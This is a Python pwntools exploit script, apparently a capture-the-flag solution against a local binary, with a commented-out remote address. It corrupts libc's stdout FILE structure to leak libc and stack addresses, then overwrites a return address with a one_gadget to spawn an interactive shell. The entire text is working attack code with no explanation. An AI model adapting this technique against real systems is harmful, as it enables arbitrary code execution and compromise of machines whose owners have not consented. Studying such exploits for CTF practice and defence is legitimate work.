#afangfang
from pwn import *

context.log_level = 'debug'

env = {"LD_PRELOAD":os.path.join(os.getcwd(), "./libc")}
p = process("./binary" , env=env)
#p = remote("124.16.75.162",40003)
libc = ELF("./libc")
#gdb.attach(p)
mmap_size = 4194304 #0x400000
init_offset = 0x401000 - 0x10

p.sendline(str(mmap_size))

def writelibc(offset,value):

    p.send(str(init_offset + offset) + " " + value)

def fflushout():

    #trigger flush.
    writelibc(libc.symbols._IO_2_1_stdout_ + 1, p8(0x20 | 0x8 | 0x2))
    writelibc(libc.symbols._IO_2_1_stdin_, p8(0x88 | 0x2))
    data = p.clean(timeout=2)
    writelibc(libc.symbols._IO_2_1_stdin_, p8(0x88))
    return data

def leak(addr):

    addr_temp = str(hex(addr))
    addr_temp2= str(hex(addr+0x3000))
    for i in range(6):
        if i == 0:
            writelibc(libc.symbols._IO_2_1_stdout_ + 0x10+i, p8(int(addr_temp[-2:],16)))
        else:
            writelibc(libc.symbols._IO_2_1_stdout_ + 0x10+i, p8(int(addr_temp[-2*i-2:-2*i],16)))
    for i in range(6):
        if i == 0:
            writelibc(libc.symbols._IO_2_1_stdout_ + 0x20+i, p8(int(addr_temp[-2:],16)))
        else:
            writelibc(libc.symbols._IO_2_1_stdout_ + 0x20+i, p8(int(addr_temp[-2*i-2:-2*i],16)))
    for i in range(6):
        if i == 0:
            writelibc(libc.symbols._IO_2_1_stdout_ + 0x28+i, p8(int(addr_temp2[-2:],16)))
        else:
            writelibc(libc.symbols._IO_2_1_stdout_ + 0x28+i, p8(int(addr_temp2[-2*i-2:-2*i],16)))

    return fflushout()


raw_input()
print hex(libc.symbols._IO_2_1_stdout_)
writelibc(libc.symbols._IO_2_1_stdout_, p8(0x84 | 0x2))
fflushout()

writelibc(libc.symbols._IO_2_1_stdout_ + 0x10, p8(0x00)) # overwrites _IO_read_end
writelibc(libc.symbols._IO_2_1_stdout_ + 0x20, p8(0x00)) # overwrites _IO_write_base

data = fflushout()
libc_addr = u64(data[24:24+6].ljust(0x8,"\x00")) - 0x3c26e0
starter = libc_addr - init_offset

stack_base  = libc_addr + libc.symbols.program_invocation_name
stk_pointer = u64(leak(stack_base)[0:8])

print hex(libc_addr)
print hex(stk_pointer)

target = libc_addr + libc.symbols.__libc_start_main + 240

leaker = leak(stk_pointer-0x3000)
offset = leaker.index(p64(target))
print "offset : " + str(offset)

ret_address = stk_pointer - 0x3000 + offset
print "this is the ret_retaddr : " + hex(ret_address)
real_offset = ret_address - starter - 0x400ff0
one_gadget = hex(libc_addr + 0xf0567)
for i in range(6):
    if i == 0:
        writelibc(real_offset+i, p8(int(one_gadget[-2:],16)))
    else:
        writelibc(real_offset+i, p8(int(one_gadget[-2*i-2:-2*i],16)))
#trigger exit
p.sendline("a")
p.interactive()

